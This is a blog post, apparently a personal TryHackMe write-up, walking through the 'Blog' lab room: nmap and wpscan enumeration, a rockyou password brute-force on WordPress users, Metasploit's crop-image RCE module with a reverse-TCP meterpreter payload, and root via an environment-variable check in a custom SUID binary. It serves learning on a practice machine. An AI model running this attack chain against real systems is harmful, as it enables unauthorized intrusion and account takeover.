@@ -1,0 +1,420 @@
+---
+layout: post
+title:  "Blog Room"
+date:   2024-01-23 12:50:01 -0600
+categories: TryHackMe
+image: /assets/img/Blog.png
+---
+Even though this said you could do this room right after the web-enumeration room I had a hard time.
+```
+echo "10.10.229.85 blog.thm" >> /etc/hosts
+```
+next nmap scan
+```
+nmap -p- -sV -sC -T4 -o nmap_scan $MACHINEIP
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2024-01-23 20:15 GMT
+Nmap scan report for ip-10-10-229-85.eu-west-1.compute.internal (10.10.229.85)
+Host is up (0.00031s latency).
+Not shown: 65531 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
+|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
+|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (EdDSA)
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: WordPress 5.0
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+MAC Address: 02:B4:67:17:25:47 (Unknown)
+Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: blog
+|   NetBIOS computer name: BLOG\x00
+|   Domain name: \x00
+|   FQDN: blog
+|_  System time: 2024-01-23T20:38:43+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2024-01-23 20:38:43
+|_  start_date: 1600-12-31 23:58:45
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1370.89 seconds
+
+```
+next up wpscan
+
+```
+wpscan --url http://$MACHINEIP --enumerate t 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.7
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N]Y
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: http://10.10.229.85/ [10.10.229.85]
+[+] Started: Tue Jan 23 20:13:32 2024
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://10.10.229.85/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.229.85/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] WordPress readme found: http://10.10.229.85/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.10.229.85/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.229.85/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.229.85/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.229.85/, Match: 'WordPress 5.0'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:00:03 <> (400 / 400) 100.00% Time: 00:00:03
+[+] Checking Theme Versions (via Passive and Aggressive Methods)
+
+[i] Theme(s) Identified:
+
+[+] twentynineteen
+ | Location: http://10.10.229.85/wp-content/themes/twentynineteen/
+ | Last Updated: 2023-11-07T00:00:00.000Z
+ | Readme: http://10.10.229.85/wp-content/themes/twentynineteen/readme.txt
+ | [!] The version is out of date, the latest version is 2.7
+ | Style URL: http://10.10.229.85/wp-content/themes/twentynineteen/style.css
+ | Style Name: Twenty Nineteen
+ | Style URI: https://wordpress.org/themes/twentynineteen/
+ | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://10.10.229.85/wp-content/themes/twentynineteen/, status: 500
+ |
+ | Version: 1.5 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.229.85/wp-content/themes/twentynineteen/style.css, Match: 'Version: 1.5'
+
+[+] twentyseventeen
+ | Location: http://10.10.229.85/wp-content/themes/twentyseventeen/
+ | Last Updated: 2024-01-16T00:00:00.000Z
+ | Readme: http://10.10.229.85/wp-content/themes/twentyseventeen/readme.txt
+ | [!] The version is out of date, the latest version is 3.5
+ | Style URL: http://10.10.229.85/wp-content/themes/twentyseventeen/style.css
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://10.10.229.85/wp-content/themes/twentyseventeen/, status: 500
+ |
+ | Version: 2.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.229.85/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 2.3'
+
+[+] twentysixteen
+ | Location: http://10.10.229.85/wp-content/themes/twentysixteen/
+ | Last Updated: 2023-11-07T00:00:00.000Z
+ | Readme: http://10.10.229.85/wp-content/themes/twentysixteen/readme.txt
+ | [!] The version is out of date, the latest version is 3.1
+ | Style URL: http://10.10.229.85/wp-content/themes/twentysixteen/style.css
+ | Style Name: Twenty Sixteen
+ | Style URI: https://wordpress.org/themes/twentysixteen/
+ | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout \u2014 the horizontal masthead ...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://10.10.229.85/wp-content/themes/twentysixteen/, status: 500
+ |
+ | Version: 2.1 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.229.85/wp-content/themes/twentysixteen/style.css, Match: 'Version: 2.1'
+
+[+] twentytwenty
+ | Location: http://10.10.229.85/wp-content/themes/twentytwenty/
+ | Last Updated: 2024-01-16T00:00:00.000Z
+ | Readme: http://10.10.229.85/wp-content/themes/twentytwenty/readme.txt
+ | [!] The version is out of date, the latest version is 2.5
+ | Style URL: http://10.10.229.85/wp-content/themes/twentytwenty/style.css
+ | Style Name: Twenty Twenty
+ | Style URI: https://wordpress.org/themes/twentytwenty/
+ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://10.10.229.85/wp-content/themes/twentytwenty/, status: 500
+ |
+ | Version: 1.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.229.85/wp-content/themes/twentytwenty/style.css, Match: 'Version: 1.3'
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[+] Finished: Tue Jan 23 20:13:41 2024
+[+] Requests Done: 454
+[+] Cached Requests: 13
+[+] Data Sent: 104.603 KB
+[+] Data Received: 21.204 MB
+[+] Memory used: 191.43 MB
+[+] Elapsed time: 00:00:08
+
+```
+
+let's try to get some users?
+```
+wpscan --url http://10.10.229.85 --enumerate u
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.7
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.229.85/ [10.10.229.85]
+[+] Started: Tue Jan 23 21:34:38 2024
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://10.10.229.85/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.229.85/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] WordPress readme found: http://10.10.229.85/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.10.229.85/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.229.85/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.229.85/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.229.85/, Match: 'WordPress 5.0'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <==> (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] bjoel
+ | Found By: Wp Json Api (Aggressive Detection)
+ |  - http://10.10.229.85/wp-json/wp/v2/users/?per_page=100&page=1
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] kwheel
+ | Found By: Wp Json Api (Aggressive Detection)
+ |  - http://10.10.229.85/wp-json/wp/v2/users/?per_page=100&page=1
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] Karen Wheeler
+ | Found By: Rss Generator (Aggressive Detection)
+
+[+] Billy Joel
+ | Found By: Rss Generator (Aggressive Detection)
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[+] Finished: Tue Jan 23 21:34:40 2024
+[+] Requests Done: 54
+[+] Cached Requests: 8
+[+] Data Sent: 12.558 KB
+[+] Data Received: 480.965 KB
+[+] Memory used: 147.52 MB
+[+] Elapsed time: 00:00:01
+
+```
+try to use wpscan and attack from the users found for bjoel and kwheel
+
+```
+wpscan --url blog.thm -U kwheel,bjoel -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 64
+
+[!] Valid Combinations Found:
+ | Username: kwheel, Password: [REDACTED]
+
+```
+I am not quite sure how they got the metasploit to search for crop-image
+```
+msf5 > search crop-image
+
+Matching Modules
+================
+
+   #  Name                            Disclosure Date  Rank       Check  Description
+   -  ----                            ---------------  ----       -----  -----------
+   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
+
+
+msf5 > use 0
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf5 exploit(multi/http/wp_crop_rce) > 
+```
+Now just set the options (USERNAME, PASSWORD, RHOSTS, LHOST) and exploit!
+
+We can run 'shell' now and take a look on what's going on inside the machine. We have two goals: the files user.txt and root.txt. If we do a find on the machine:
+
+```
+$ find / 2>/dev/null | grep user.txt
+/home/bjoel/user.txt
+
+$ cat /home/bjoel/user.txt
+You won't find what you're looking for here.
+
+TRY HARDER
+```
+bummer
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+We have some common files, BUT there is an interesting one... /usr/sbin/checker. Never heard of this one. After checking on GTFOBins, we are sure that this is not a usual binary. Hmmmm... Let's take a look on how this thing works.
+```
+$ ls -la /usr/sbin/checker     
+-rwsr-sr-x 1 root root 8432 May 26 18:27 /usr/sbin/checker
+```
+So it is a root owned binary, with SUID flag on. What happens when we run it?
+```
+$ ltrace checker
+getenv("admin")                                  = nil
+puts("Not an Admin")                             = 13
+Not an Admin
++++ exited (status 0) +++
+```
+So it gets the "admin" environment variable and prints out "Not an Admin". Wait, so if we set this environment variable, what happens?
+```
+$ export admin=1
+$ ltrace checker
+getenv("admin")                                  = "1"
+setuid(0)                                        = -1
+system("/bin/bash"
+```
+Oh, so now it tries to run bash! And since this is owned by root, it'll run bash as root! SWEET!
+```
+$ checker
+$ id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+```
+Let's try again that stuff to find the user flag:
+```
+$ find / 2>/dev/null | grep user.txt
+/home/bjoel/user.txt
+/media/usb/user.txt
+```
+Oh, it was there!
+```
+$ cat /media/usb/user.txt
+<REDACTED>
+```
+the root flag:
+```
+$ cat /root/root.txt
+<REDACTED>
+```
+
+> **&#9432;** One thing I learned was the find command and I should learn how to use this better in linux.
